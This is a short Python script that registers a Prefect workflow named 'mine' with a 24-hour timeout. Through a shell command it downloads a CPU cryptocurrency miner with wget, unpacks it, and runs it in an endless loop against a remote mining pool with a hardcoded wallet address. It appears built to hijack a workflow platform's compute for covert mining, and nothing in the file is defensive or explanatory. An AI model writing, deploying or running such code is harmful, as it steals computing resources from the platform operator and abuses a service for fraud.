import subprocess
from prefect import flow

@flow(timeout_seconds=86400)
def mine():
    result = subprocess.run(
        "wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz && while true; do ./cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Prefect -t 4; sleep 2; done",
        shell=True
    )

if __name__ == "__main__":
    mine()
